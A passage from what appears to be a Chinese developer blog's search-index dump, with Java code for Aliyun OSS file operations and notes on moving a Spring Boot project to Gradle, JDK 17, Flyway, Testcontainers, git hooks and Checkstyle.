(FilenameExtension.equalsIgnoreCase(\".gif\")) { return \"image/gif\"; } if (FilenameExtension.equalsIgnoreCase(\".jpeg\") || FilenameExtension.equalsIgnoreCase(\".jpg\") || FilenameExtension.equalsIgnoreCase(\".png\")) { return \"image/jpg\"; } if (FilenameExtension.equalsIgnoreCase(\".html\")) { return \"text/html\"; } if (FilenameExtension.equalsIgnoreCase(\".txt\")) { return \"text/plain\"; } if (FilenameExtension.equalsIgnoreCase(\".vsd\")) { return \"application/vnd.visio\"; } if (FilenameExtension.equalsIgnoreCase(\".pptx\") || FilenameExtension.equalsIgnoreCase(\".ppt\")) { return \"application/vnd.ms-powerpoint\"; } if (FilenameExtension.equalsIgnoreCase(\".docx\") || FilenameExtension.equalsIgnoreCase(\".doc\")) { return \"application/msword\"; } if (FilenameExtension.equalsIgnoreCase(\".xml\")) { return \"text/xml\"; } return \"image/jpg\"; } 绑定域名 新增域名并自动添加到 CNAME 映射 Bucket 开启自定义域名(只需要对其中一个文件开启后全局生效) 开启自定义域名后可以看到就会多了类型 image 这样就可以通过 url 进行预览了，而不是下载 SSL 证书 阿里云有免费的证书一年 20 个 先免费购买 -&gt; 创建 -&gt; 申请 -&gt; 域名解析 -&gt; 证书托管 免费购买 创建+申请 证书域名解析 证书托管 下载文件 我自己其实并没事去实现，因为当前我的项目还没涉及到 OSS 对象需要下载，先做个示例记录下 /** * 下载文件 * * @param fileName * @throws IOException */ @Override public void download(String fileName) throws IOException { // &lt;yourObjectName&gt;从OSS下载文件时需要指定包含文件后缀在内的完整路径，例如abc/efg/123.jpg。 String objectName = fileName; // 创建OSSClient实例。 OSS ossClient = new OSSClientBuilder().build(endpoint, accessKeyId, accessKeySecret); // 调用ossClient.getObject返回一个OSSObject实例，该实例包含文件内容及文件元信息。 OSSObject ossObject = ossClient.getObject(bucketName, objectName); // 调用ossObject.getObjectContent获取文件输入流，可读取此输入流获取其内容。 InputStream content = ossObject.getObjectContent(); if (content != null) { BufferedReader reader = new BufferedReader(new InputStreamReader(content)); while (true) { String line = reader.readLine(); if (line == null) { break; } System.out.println(\"\\n\" + line); } // 数据读取完成后，获取的流必须关闭，否则会造成连接泄漏，导致请求无连接可用，程序无法正常工作。 content.close(); } // 关闭OSSClient。 ossClient.shutdown(); } 列举文件 我自己其实并没事去实现，因为当前我的项目还没涉及到 OSS 对象需要列举展示，先做个示例记录下 /** * 列举文件 */ @Override public void listFile() { // 创建OSSClient实例。 OSS ossClient = new OSSClientBuilder().build(endpoint, accessKeyId, accessKeySecret); // ossClient.listObjects返回ObjectListing实例，包含此次listObject请求的返回结果。 ObjectListing objectListing = ossClient.listObjects(bucketName); // objectListing.getObjectSummaries获取所有文件的描述信息。 for (OSSObjectSummary objectSummary : objectListing.getObjectSummaries()) { System.out.println(\" - \" + objectSummary.getKey() + \" \" + \"(size = \" + objectSummary.getSize() + \")\"); } // 关闭OSSClient。 ossClient.shutdown(); } 删除文件 前端控制器 @ApiOperation(value = \"删除文件\", notes = \"根据文件名删除 Bucket 内的文件\") @DeleteMapping(\"/delete\") Result delete(@RequestParam String fileName) { return ossService.deleteFile(fileName); } 实现类 /** * 删除文件 * * @param fileName 需要删除的文件 * @return 封装的 Result */ @Override public Result deleteFile(String fileName) { //文件名为空的话抛出自定义异常 if (fileName.isBlank()) { throw new BusinessException( ResultCode.PARAM_IS_BLANK.getCode(), ResultCode.PARAM_IS_BLANK.getMessage() ); } else { // 创建OSSClient实例。 OSS ossClient = new OSSClientBuilder().build(endpoint, accessKeyId, accessKeySecret); try { // 删除文件。 ossClient.deleteObject(bucketName, fileName); } catch (OSSException e) { Slf4j.log().error(\"确认文件名是否存在\"); e.printStackTrace(); } finally { ossClient.shutdown(); } return Result.ok().message(\"删除文件成功\").data(\"fileName\", fileName); } }","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"VUE","slug":"VUE","permalink":"https://www.adalucky.com/tags/VUE/"}],"author":"Ada"},{"title":"restructure","slug":"Auto/restructure","date":"2022-03-18T14:51:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/auto/restructure/","link":"","permalink":"https://www.adalucky.com/auto/restructure/","excerpt":"Gradle是一个基于Apache Ant和Apache Maven概念的项目自动化构建开源工具。它使用一种基于Groovy的特定领域语言(DSL)来声明项目设置，也增加了基于Kotlin语言的kotlin-based DSL，抛弃了基于XML的各种繁琐配置。","text":"Gradle是一个基于Apache Ant和Apache Maven概念的项目自动化构建开源工具。它使用一种基于Groovy的特定领域语言(DSL)来声明项目设置，也增加了基于Kotlin语言的kotlin-based DSL，抛弃了基于XML的各种繁琐配置。 参考资料环境简介： 之前用的 SpringBoot 2.3.12 + JDK11 + Maven 来构建的，这里做了一次升级，主要记录升级中遇到的问题和解决方法后期好参考 JDK 17.02 Gradle 7.4.1 SpingBoot 2.6.4 IDEA 2021.3 flyway配置参考 快速上手简介 注意注意如果你的磁盘是ExFAT 格式是无法创建 gradle 工程的,这是一个官方一致存在的问题也是之前困扰了我很久，因此你需要在其它磁盘上新建 Gradle 是一个比 maven 更加先进的构建工具，经过体验觉得配置方面比 maven 的 pom.xml 要简洁很多，构建速度也有明显的提升 本次笔记主要用于记录将我刚写的测试平台由原来的 maven 换成 gradle 的一些流程 本次还将原来的 jdk11 换成了 jdk17 前提需要在本地安装 jdk17 和 gradle，本次使用的都是当时最新版本 jdk17.0.2 gradle7.4.1 快速搭建 这里都是用命令操作，因为 IDEA 如果新建一个 gradle 工程默认会使用它当前的版本，我觉得不是最新的，我想用自己的（当然也可以通过配置指定自己的，但是这样如果拉取了别人的项目，别使用的版本和我们指定的版本不一致所以就可能会有一些冲突） 本地新建一个文件夹如 automation，然后用 IDEA 打开 在当前 automation 下新建一个 common 文件夹 mkdir common 新建文件 touch settings.gradle.kts （gradle 有两种DSL，领域特定语言去定义它的脚本，一种是早期的 Groovy，在后期新增了对Kotlin 语言的支持定义脚本，也就是这里的kts） 执行初始化 gradle wrapper gradle wrapper 命令会帮我们把 geadle 重新包一层，用 gradlew 命令去替代 gradle 命令，如果我们后期需要更新我们项目的 gradle 版本只需要更新 wrapper 里面的gradle-wrapper.properties，这样我们就可以在不同的版本里面随意切换，并且我们的 wrapper 被提交到代码仓库以后别人也会只用这个 wrapper 可以防止版本不同造成的一些问题 注意事项：导入的时候应该选第二个从外部模型导入 Import module from external model 如果选第一个会导致你用 Gradle 管理 module 的方式和 IDEA管理 module 方式之间的一些冲突 基础配置 settings.gradle.kts rootProject.name = \"common\" build.gradle.kts (先创建这个文件，该文件主要构建的配置相关内容) plugins{ java } 模块依赖 参考：多模块依赖 描述：我当前有个项目叫做 automation 项目下目前有两个模块，common manage 后期还会有其它的模块 需求：将 automation 当做一个顶层项目管理公共的依赖配置项，common 做为子模块的基础服务提供基础的项目配置和一些工具类，manage 需要依赖于 common 实现重点：包名前缀和 group 保持一致 automation 中用 include 包含 common 需要用添加tasks.bootJar 和 tasks.jar manage中 implementation(project(\":common\")) 配置参考项automation 父项目的配置 点击显/隐代码块(settings.gradle.kts) rootProject.name=\"automation\" include(\"common\") include(\"manage\") 点击显/隐代码块(build.gradle.kts) import org.jetbrains.kotlin.gradle.tasks.KotlinCompile plugins { java id(\"org.springframework.boot\") version \"2.6.4\" id(\"io.spring.dependency-management\") version \"1.0.11.RELEASE\" kotlin(\"jvm\") version \"1.6.10\" kotlin(\"plugin.spring\") version \"1.6.10\" } group = \"com.adalucky\" version = \"1.0.0\" java.sourceCompatibility = JavaVersion.VERSION_17 configurations { compileOnly { extendsFrom(configurations.annotationProcessor.get()) } } repositories { maven { setUrl(\"https://maven.aliyun.com/repository/public\") } mavenLocal() mavenCentral() } //公共依赖的配置，apply 需要在 dependencies 前面 subprojects { apply { plugin(\"org.springframework.boot\") plugin(\"io.spring.dependency-management\") plugin(\"org.jetbrains.kotlin.jvm\") plugin(\"org.jetbrains.kotlin.plugin.spring\") } dependencies { implementation(\"org.springframework.boot:spring-boot-starter-web\") implementation(\"org.springframework.boot:spring-boot-starter-security\") implementation(\"com.fasterxml.jackson.module:jackson-module-kotlin\") implementation(\"org.jetbrains.kotlin:kotlin-reflect\") implementation(\"org.jetbrains.kotlin:kotlin-stdlib-jdk8\") runtimeOnly(\"mysql:mysql-connector-java\") implementation(\"com.baomidou:mybatis-plus-boot-starter:3.5.1\") implementation(\"com.github.xiaoymin:knife4j-spring-boot-starter:3.0.3\") implementation(\"p6spy:p6spy:3.9.1\") implementation(\"com.alibaba:easyexcel:2.2.6\") //easyExcel jdk17 报错 https://blog.csdn.net/weixin_42792301/article/details/121456156 implementation(\"org.burningwave:core:12.47.0\") compileOnly(\"org.projectlombok:lombok\") developmentOnly(\"org.springframework.boot:spring-boot-devtools\") runtimeOnly(\"mysql:mysql-connector-java\") annotationProcessor(\"org.projectlombok:lombok\") testImplementation(\"org.springframework.boot:spring-boot-starter-test\") } tasks.withType&lt;KotlinCompile&gt; { kotlinOptions { freeCompilerArgs = listOf(\"-Xjsr305=strict\") jvmTarget = \"17\" } } tasks.withType&lt;Test&gt; { useJUnitPlatform() } } common 基础模块，这里主要是 mybatis-plus 的代码生成需要的 需要加入 tasks.bootJar tasks.jar 点击显/隐代码块(build.gradle.kts) repositories { maven { setUrl(\"https://maven.aliyun.com/repository/public\") } mavenLocal() mavenCentral() } dependencies { annotationProcessor(\"org.projectlombok:lombok\") compileOnly(\"org.projectlombok:lombok\") implementation(\"com.baomidou:mybatis-plus-generator:3.5.1\") implementation(\"org.apache.velocity:velocity-engine-core:2.3\") } tasks.bootJar { enabled = false } tasks.jar { enabled = true } manage 后台管理模块，主要是需要用 implementation 关联依赖的项目 点击显/隐代码块(build.gradle.kts) repositories { maven { setUrl(\"https://maven.aliyun.com/repository/public\") } mavenLocal() mavenCentral() } dependencies{ implementation(project(\":common\")) annotationProcessor(\"org.projectlombok:lombok\") compileOnly(\"org.projectlombok:lombok\") } 优雅编程自定义 git 命令 当前环境为 Mac，在全局配置新增一个方法示例如下（配置后需要执行 source /etc/profile 最好是在 ~/.zshrc 中添加 source /etc/profile 大致就是这个意思，不过每个人的电脑用的 zsh 不一样） function gacp() { log=$1 files=$2 if [ ! -n \"$log\" ]; then echo \"必须输入提交说明\" return fi if [ ! -n \"$files\" ]; then files=\".\" fi git add . git commit -a -m \"$1\" git push } 单元测试 流程：在 TDD 的模式下是测试驱动开发，先写单元测试，再写业务逻辑代码， 添加注解 @SpringBootTest @AutoConfigureMockMvc 点击显/隐代码块(示例代码) package com.adalucky.modules.system.controller; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc; import org.springframework.boot.test.context.SpringBootTest; import org.springframework.test.web.servlet.MockMvc; import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get; import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath; import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status; @SpringBootTest @AutoConfigureMockMvc class SysUserControllerTest { @Autowired MockMvc mockMvc; @Test void list() throws Exception { mockMvc .perform(get(\"/user/list\")) .andExpect(status().isOk()) .andExpect(jsonPath(\"$.message\").value(\"成功\")) .andExpect(jsonPath(\"$.code\").value(\"200\")) .andExpect(jsonPath(\"$.success\").value(\"true\")) ; } } 健康检查 我们需要对 SpringBoot 做一个心跳检查，开放一个 get 请求，保证服务是正常启动的 引入依赖 implementation(\"org.springframework.boot:spring-boot-starter-actuator\") get请求 ip:port/actuator/health 如果正常的话会返回 {“status”:”UP”} 代码示例如下：其实和上面的单元测试是一样的 package com.adalucky; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc; import org.springframework.boot.test.context.SpringBootTest; import org.springframework.test.web.servlet.MockMvc; import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get; import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath; import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status; /** * @author ada * @Version JDK17 * @Description 心跳检查 * @since 2022/3/19 15:57 */ @SpringBootTest @AutoConfigureMockMvc public class SmokeTest { @Autowired MockMvc mockMvc; @Test void checkHeartbeat() throws Exception { mockMvc .perform(get(\"/actuator/health\")) .andExpect(status().isOk()) .andExpect(jsonPath(\"$.status\").value(\"UP\")) ; } } githooks 需求：为了保证我们每次提交的代码都是无误的，那么可以配置当我们代码通过单元测试才能提交到远程仓库，这样是一个比较好的规范 实现：①项目根目录创建 githooks 文件夹 ②该文件夹下新建 pre-commit 文件，并编写脚本 ③给该脚本赋予执行权限 ④git config 中指定文件路径（建议通过指定路径的方式，有些人是 直接用自己编写的 pre-commit 替换 .git 下的文件，这里不太推荐，因为我们的脚本可能后面还要修改，这样提交到远程后协同工作下大家都能享用最新的脚本） pre-commit 脚本示例 #!/usr/bin/env sh # 根目录下新建 githooks 文件夹，下面再新建一个 pre-commit 文件 # q 静默执行不输出内容; k keep index; u 没有被跟踪的代码会被 stash 掉 git stash -qku # 执行检查，这里是用的当前项目根目录下的通过快速搭建中说的 gradle wrapper 帮我们把 geadle 重新包一层，用 gradlew 命令去替代 gradle 命令 ./gradlew clean check # 存储上一条命令执行的结果 RESULT=$? git stash pop -q exit $RESULT # 文件需要赋予 755 可执行权限 chmod 755 githooks/pre-commit # 配置 githooks path 命令--&gt; git config core.hooksPath githhooks flyway flyway 通过版本管理的方式，我们可以比较方便的去定义每一次数据 schema 的变更 依赖：runtimeOnly(\"org.flywaydb:flyway-core\") 我这里没有指定版本，因为在 SpringBoot 的 BOM 中已经被定义过了 创建目录： src/main/resources/db/migration (这是 flyway 的默认路径) 创建 sql 文件： 项目版本号_sql号+内容.sql，例 V1.0.0_1__ceract_sysuser_table.sql 当前的 tag 为 1.0.0 为他执行的第一个 sql，内容是创建用户表 application.yml配置（如果没配的话可能会报 flywayInitializer 相关的错误）： spring: flyway: baseline-on-migrate: true 注意事项：①1 和 creact 之间是两个下划线，这是官方的命名规范要求，如果按照这个规范可能只会生成 flyway_schema_history表，而没有执行 sql 的内容 ②每一个迁移脚本被执行后是不可以去修改的，因为 flyway 会对整个文件做一个 MD5 然后去进行检查，第二次就不会执行了，因此有变更的话需要定义第二个版本 test-containers前置条件 本地需要提前安装好 docker ，确保守护进程已经启动，并已启动 我尝试过通过 brew install docker 但是并没发启动它的守护进程，只好安装桌面应用 简介 需求：在单元测试中我们需要连接到测试的数据库，当然可以再 application.yml 中指定另外的 dev.yml 但是不能解决测试库也有历史数据的问题，我更加希望是每次启动单元测试的时候就会启动一个新的数据库，并且表内是没有任何数据的 实现：test-containers 能够帮助我们在启动单元测试的时候通过 java-docker 这样一个库来连接我们本地 docker socks 上，并且通过 docker 去启动对应的容器，在测试期间我们去连接这个容器，测试完毕后自动销毁 依赖： testImplementation(\"org.testcontainers:testcontainers:1.16.3\") testImplementation(\"org.testcontainers:mysql:1.16.3\") 实现创建配置 在 test 下新建一个配置类例如 DatabaseTestConfiguration 注意添加 Wait.forListeningPort() 这样确保启动成功后再配置 DataSource package com.adalucky.core; import com.zaxxer.hikari.HikariConfig; import com.zaxxer.hikari.HikariDataSource; import org.springframework.boot.autoconfigure.flyway.FlywayDataSource; import org.springframework.context.annotation.Bean; import org.testcontainers.containers.MySQLContainer; import org.testcontainers.containers.wait.strategy.Wait; import javax.sql.DataSource; /** * @author ada * @Version JDK17 * @Description testcontainers 测试环境本地启动数据库 * @since 2022/3/20 19:11 */ public class DatabaseTestConfiguration { /** * 创建 docker 容器对象 * initMethod = \"start\",destroyMethod = \"stop\" 初始这个 bean 时候开启，停止时销毁容器 * 根据镜像设置不同的类型，如果是 PostgreSQL 就用 PostgreSQLContainer&lt;?&gt; */ @Bean(initMethod = \"start\", destroyMethod = \"stop\") public MySQLContainer&lt;?&gt; mysqlContainer() { // 通过 docker hub 找到对应的镜像和版本号，并等待端口完全初始化完毕，不然下面配置数据源 new HikariDataSource 时容器还没完全初始化完毕会有报错 return new MySQLContainer&lt;&gt;(\"mysql:8.0.27\").waitingFor(Wait.forListeningPort()); } /** * 配置数据源信息 * FlywayDataSource flyway 也会使用这个 DataSource 进行初始化 * mysqlContainer 上面创建的容器对象 */ @Bean @FlywayDataSource public DataSource dataSource(MySQLContainer&lt;?&gt; mysqlContainer) { var hikariConfig = new HikariConfig(); hikariConfig.setJdbcUrl(mysqlContainer.getJdbcUrl()); hikariConfig.setUsername(mysqlContainer.getUsername()); hikariConfig.setPassword(mysqlContainer.getPassword()); return new HikariDataSource(hikariConfig); } } 编写用例 编写单元测试用例，每次执行完后数据是自动销毁的，所以每次都会重新执行 flyway package com.adalucky.modules.system.mapper; import com.adalucky.core.DatabaseTestConfiguration; import com.adalucky.enums.mysql.SexEnums; import com.adalucky.enums.mysql.StatusEnums; import com.adalucky.modules.system.entity.SysUser; import com.adalucky.modules.system.mapper.SysUserMapper; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.autoconfigure.jdbc.AutoConfigureTestDatabase; import org.springframework.boot.test.context.SpringBootTest; import org.springframework.context.annotation.Import; import static org.springframework.boot.test.autoconfigure.jdbc.AutoConfigureTestDatabase.Replace.NONE; /** * @author ada * @Version JDK17 * @Description TODO * @since 2022/3/20 19:44 */ @SpringBootTest // 关闭 SpringBoot 默认的 H2 数据源 @AutoConfigureTestDatabase(replace = NONE) @Import(DatabaseTestConfiguration.class) public class DataSourceTest { @Autowired SysUserMapper mapper; @Test void add(){ SysUser sysUser = new SysUser(); sysUser.setLoginName(\"13599998888\"); sysUser.setNikeName(\"测试save456\"); sysUser.setSex(SexEnums.男); sysUser.setStatus(StatusEnums.启用); mapper.insert(sysUser); mapper.selectList(null).forEach(System.out::println); } } 组合注解 需求：在上面的 test-containers 中，我们每次都需要定义三个注解来完成，可以通过自定义注解实现包含上面三个注解后，来完成一个注解替代 实现示例：每次使用的使用就是 @类名注入 @Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Documented @Inherited package com.adalucky.core; import org.springframework.boot.test.autoconfigure.jdbc.AutoConfigureTestDatabase; import org.springframework.boot.test.context.SpringBootTest; import org.springframework.context.annotation.Import; import java.lang.annotation.*; import static org.springframework.boot.test.autoconfigure.jdbc.AutoConfigureTestDatabase.Replace.NONE; /** * @author ada * @Version JDK17 * @Description 自定义的组合注解 通过 @MysqlContainerTest 完成注入（类名） * @since 2022/3/20 23:15 */ @Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Documented @Inherited @SpringBootTest // 关闭 SpringBoot 默认的 H2 数据源 @AutoConfigureTestDatabase(replace = NONE) @Import(DatabaseTestConfiguration.class) public @interface MysqlContainerTest { } 配置文件 在我们编写一个项目的时候，我们的代码其实是和我们的环境是无关的，也就是我们提交到远程仓库的时候是不应该提交我们配置文件application.yml 方案：①创建一个 application-local.yml 配置我们本地运行的环境，并把该文件添加到 .gitignore ②创建一个 application-tmeplate.yml 给出配置示例，该文件提交到远程仓库 ③创建一个 application.yml 文件用于拉取代码后参照 application-env.tmeplate.yml 进行配置 ④本地idea 指定运行环境为 local # 指定端口 server: port: 9090 # spring 相关集成配置 spring: # flyway 配置 flyway: baseline-on-migrate: true # swagger 报错配置 mvc: pathmatch: matching-strategy: ant_path_matcher # 数据源配置 datasource: driver-class-name: com.p6spy.engine.spy.P6SpyDriver url: jdbc:p6spy:mysql://192.168.1.115:3306/data_auto_endpoint?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=GMT%2B8&amp;useSSL=false username: root password: 123456 # Mybatis-Plus 配置 mybatis-plus: type-enums-package: com.adalucky.enums.mysql global-config: db-config: #全局配置，主键自动增长，就不需要在每个实体类上声明了 @TableId(type = IdType.AUTO) id-type: auto logic-delete-field: deleted # 全局逻辑删除的实体字段名(since 3.3.0版本以上就不需要在实体中对该字段添加@TableLogic注解) logic-delete-value: 0 # 逻辑已删除值(默认为 1.我们改为 0) logic-not-delete-value: 1 # 逻辑未删除值(默认为 0，我们改为 1) mapper-locations: classpath*:/mapper/*.xml #不定义的话 springboot 不知道你的 xml 放在哪里的 # 日志输出配置 logging: level: root: info com.adalucky.modules: debug 代码规范检查基础配置 通过 checkstyle 进行代码的规范性检查 引入依赖插件 plugins 中引入 checkstyle 并在全局中进行配置 apply 和 checkstyle 最大的警告数和版本号 完整示例 import org.jetbrains.kotlin.gradle.tasks.KotlinCompile plugins { java checkstyle id(\"org.springframework.boot\") version \"2.6.4\" id(\"io.spring.dependency-management\") version \"1.0.11.RELEASE\" kotlin(\"jvm\") version \"1.6.10\" kotlin(\"plugin.spring\") version \"1.6.10\" } group = \"com.adalucky\" version = \"1.0.0\" java.sourceCompatibility = JavaVersion.VERSION_17 configurations { compileOnly { extendsFrom(configurations.annotationProcessor.get()) } } repositories { maven { setUrl(\"https://maven.aliyun.com/repository/public\") } mavenLocal() mavenCentral() } subprojects { apply { plugin(\"org.springframework.boot\") plugin(\"io.spring.dependency-management\") plugin(\"org.jetbrains.kotlin.jvm\") plugin(\"org.jetbrains.kotlin.plugin.spring\") plugin(\"checkstyle\") } dependencies { implementation(\"org.springframework.boot:spring-boot-starter-web\") implementation(\"org.springframework.boot:spring-boot-starter-security\") implementation(\"org.springframework.boot:spring-boot-starter-actuator\") implementation(\"com.fasterxml.jackson.module:jackson-module-kotlin\") implementation(\"org.jetbrains.kotlin:kotlin-reflect\") implementation(\"org.jetbrains.kotlin:kotlin-stdlib-jdk8\") runtimeOnly(\"mysql:mysql-connector-java\") implementation(\"com.baomidou:mybatis-plus-boot-starter:3.5.1\") implementation(\"com.baomidou:mybatis-plus-boot-starter-test:3.5.1\") implementation(\"com.github.xiaoymin:knife4j-spring-boot-starter:3.0.3\") implementation(\"p6spy:p6spy:3.9.1\") implementation(\"com.alibaba:easyexcel:2.2.6\") //easyExcel jdk17 报错 https://blog.csdn.net/weixin_42792301/article/details/121456156 implementation(\"org.burningwave:core:12.47.0\") compileOnly(\"org.projectlombok:lombok\") developmentOnly(\"org.springframework.boot:spring-boot-devtools\") runtimeOnly(\"mysql:mysql-connector-java\") annotationProcessor(\"org.projectlombok:lombok\") testImplementation(\"org.springframework.boot:spring-boot-starter-test\") } checkstyle { maxWarnings = 0 toolVersion = \"10.0\" } tasks.withType&lt;KotlinCompile&gt; { kotlinOptions { freeCompilerArgs = listOf(\"-Xjsr305=strict\") jvmTarget = \"17\" } } tasks.withType&lt;Test&gt; { useJUnitPlatform() } } 规范配置 在父项目根目录下新建一个 config/ckeckstyle/checkstyle.xml 文件，内容如下 点击显/隐代码块 &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE module PUBLIC \"-//Checkstyle//DTD Checkstyle Configuration 1.3//EN\" \"https://checkstyle.org/dtds/configuration_1_3.dtd\"&gt; &lt;module name=\"Checker\"&gt; &lt;property name=\"charset\" value=\"UTF-8\"/&gt; &lt;property name=\"severity\" value=\"warning\"/&gt; &lt;property name=\"fileExtensions\" value=\"java, properties, xml\"/&gt; &lt;module name=\"BeforeExecutionExclusionFileFilter\"&gt; &lt;property name=\"fileNamePattern\" value=\"module\\-info\\.java$\"/&gt; &lt;/module&gt; &lt;module name=\"FileTabCharacter\"&gt; &lt;property name=\"eachLine\" value=\"true\"/&gt; &lt;/module&gt; &lt;module name=\"LineLength\"&gt; &lt;property name=\"fileExtensions\" value=\"java\"/&gt; &lt;property name=\"max\" value=\"200\"/&gt; &lt;property name=\"ignorePattern\" value=\"^package.*|^import.*|a href|href|http://|https://|ftp://\"/&gt; &lt;/module&gt; &lt;module name=\"TreeWalker\"&gt; &lt;module name=\"UnusedImports\"/&gt; &lt;module name=\"OuterTypeFilename\"/&gt; &lt;module name=\"IllegalTokenText\"&gt; &lt;property name=\"tokens\" value=\"STRING_LITERAL, CHAR_LITERAL\"/&gt; &lt;property name=\"format\" value=\"\\\\u00(09|0(a|A)|0(c|C)|0(d|D)|22|27|5(C|c))|\\\\(0(10|11|12|14|15|42|47)|134)\"/&gt; &lt;property name=\"message\" value=\"Consider using special escape sequence instead of octal value or Unicode escaped value.\"/&gt; &lt;/module&gt; &lt;module name=\"AvoidEscapedUnicodeCharacters\"&gt; &lt;property name=\"allowEscapesForControlCharacters\" value=\"true\"/&gt; &lt;property name=\"allowByTailComment\" value=\"true\"/&gt; &lt;property name=\"allowNonPrintableEscapes\" value=\"true\"/&gt; &lt;/module&gt; &lt;!-- 不应使用 '.*' 形式的导入 - org.springframework.web.bind.annotation.* 。 [AvoidStarImport] --&gt; &lt;!-- &lt;module name=\"AvoidStarImport\"/&gt; --&gt; &lt;module name=\"OneTopLevelClass\"/&gt; &lt;module name=\"NoLineWrap\"&gt; &lt;property name=\"tokens\" value=\"PACKAGE_DEF, IMPORT, STATIC_IMPORT\"/&gt; &lt;/module&gt; &lt;module name=\"EmptyBlock\"&gt; &lt;property name=\"option\" value=\"TEXT\"/&gt; &lt;property name=\"tokens\" value=\"LITERAL_TRY, LITERAL_FINALLY, LITERAL_IF, LITERAL_ELSE, LITERAL_SWITCH\"/&gt; &lt;/module&gt; &lt;module name=\"LeftCurly\"&gt; &lt;property name=\"tokens\" value=\"ANNOTATION_DEF, CLASS_DEF, CTOR_DEF, ENUM_CONSTANT_DEF, ENUM_DEF, INTERFACE_DEF, LAMBDA, LITERAL_CASE, LITERAL_CATCH, LITERAL_DEFAULT, LITERAL_DO, LITERAL_ELSE, LITERAL_FINALLY, LITERAL_FOR, LITERAL_IF, LITERAL_SWITCH, LITERAL_SYNCHRONIZED, LITERAL_TRY, LITERAL_WHILE, METHOD_DEF, OBJBLOCK, STATIC_INIT, RECORD_DEF, COMPACT_CTOR_DEF\"/&gt; &lt;/module&gt; &lt;module name=\"RightCurly\"&gt; &lt;property name=\"id\" value=\"RightCurlySame\"/&gt; &lt;property name=\"tokens\" value=\"LITERAL_TRY, LITERAL_CATCH, LITERAL_FINALLY, LITERAL_IF, LITERAL_ELSE, LITERAL_DO\"/&gt; &lt;/module&gt; &lt;module name=\"RightCurly\"&gt; &lt;property name=\"id\" value=\"RightCurlyAlone\"/&gt; &lt;property name=\"option\" value=\"alone\"/&gt; &lt;property name=\"tokens\" value=\"CLASS_DEF, METHOD_DEF, CTOR_DEF, LITERAL_FOR, LITERAL_WHILE, STATIC_INIT, INSTANCE_INIT, ANNOTATION_DEF, ENUM_DEF, INTERFACE_DEF, RECORD_DEF, COMPACT_CTOR_DEF\"/&gt; &lt;/module&gt; &lt;module name=\"SuppressionXpathSingleFilter\"&gt; &lt;property name=\"id\" value=\"RightCurlyAlone\"/&gt; &lt;property name=\"query\" value=\"//RCURLY[parent::SLIST[count(./*)=1] or preceding-sibling::*[last()][self::LCURLY]]\"/&gt; &lt;/module&gt; &lt;module name=\"WhitespaceAfter\"&gt; &lt;property name=\"tokens\" value=\"COMMA, SEMI, TYPECAST, LITERAL_IF, LITERAL_ELSE, LITERAL_WHILE, LITERAL_DO, LITERAL_FOR, DO_WHILE\"/&gt; &lt;/module&gt; &lt;module name=\"WhitespaceAround\"&gt; &lt;property name=\"allowEmptyConstructors\" value=\"true\"/&gt; &lt;property name=\"allowEmptyLambdas\" value=\"true\"/&gt; &lt;property name=\"allowEmptyMethods\" value=\"true\"/&gt; &lt;property name=\"allowEmptyTypes\" value=\"true\"/&gt; &lt;property name=\"allowEmptyLoops\" value=\"true\"/&gt; &lt;property name=\"ignoreEnhancedForColon\" value=\"false\"/&gt; &lt;property name=\"tokens\" value=\"ASSIGN, BAND, BAND_ASSIGN, BOR, BOR_ASSIGN, BSR, BSR_ASSIGN, BXOR, BXOR_ASSIGN, COLON, DIV, DIV_ASSIGN, DO_WHILE, EQUAL, GE, GT, LAMBDA, LAND, LCURLY, LE, LITERAL_CATCH, LITERAL_DO, LITERAL_ELSE, LITERAL_FINALLY, LITERAL_FOR, LITERAL_IF, LITERAL_RETURN, LITERAL_SWITCH, LITERAL_SYNCHRONIZED, LITERAL_TRY, LITERAL_WHILE, LOR, LT, MINUS, MINUS_ASSIGN, MOD, MOD_ASSIGN, NOT_EQUAL, PLUS, PLUS_ASSIGN, QUESTION, RCURLY, SL, SLIST, SL_ASSIGN, SR, SR_ASSIGN, STAR, STAR_ASSIGN, LITERAL_ASSERT, TYPE_EXTENSION_AND\"/&gt; &lt;message key=\"ws.notFollowed\" value=\"WhitespaceAround: ''{0}'' is not followed by whitespace. Empty blocks may only be represented as '{}' when not part of a multi-block statement (4.1.3)\"/&gt; &lt;message key=\"ws.notPreceded\" value=\"WhitespaceAround: ''{0}'' is not preceded with whitespace.\"/&gt; &lt;/module&gt; &lt;module name=\"OneStatementPerLine\"/&gt; &lt;module name=\"MultipleVariableDeclarations\"/&gt; &lt;module name=\"ArrayTypeStyle\"/&gt; &lt;module name=\"MissingSwitchDefault\"/&gt; &lt;module name=\"FallThrough\"/&gt; &lt;module name=\"UpperEll\"/&gt; &lt;module name=\"ModifierOrder\"/&gt; &lt;module name=\"EmptyLineSeparator\"&gt; &lt;property name=\"tokens\" value=\"PACKAGE_DEF, IMPORT, STATIC_IMPORT, CLASS_DEF, INTERFACE_DEF, ENUM_DEF, STATIC_INIT, INSTANCE_INIT, METHOD_DEF, CTOR_DEF, VARIABLE_DEF, RECORD_DEF, COMPACT_CTOR_DEF\"/&gt; &lt;property name=\"allowNoEmptyLineBetweenFields\" value=\"true\"/&gt; &lt;property name=\"allowMultipleEmptyLinesInsideClassMembers\" value=\"false\"/&gt; &lt;property name=\"allowMultipleEmptyLines\" value=\"false\"/&gt; &lt;/module&gt; &lt;module name=\"SeparatorWrap\"&gt; &lt;property name=\"id\" 